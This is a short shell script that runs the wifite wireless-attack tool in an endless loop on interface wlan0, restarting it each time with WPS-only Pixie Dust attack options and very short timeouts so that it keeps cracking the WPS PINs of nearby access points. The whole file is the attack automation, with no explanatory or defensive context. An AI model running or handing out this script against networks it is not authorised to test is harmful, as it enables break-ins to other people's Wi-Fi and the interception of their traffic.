#!/bin/sh
while (true)
do
killall wifite;
wifite -i wlan0 -p 5 --wps --wps-only --pixie --wps-fails 1 --wps-timeouts 1 --wps-time 5;
done;
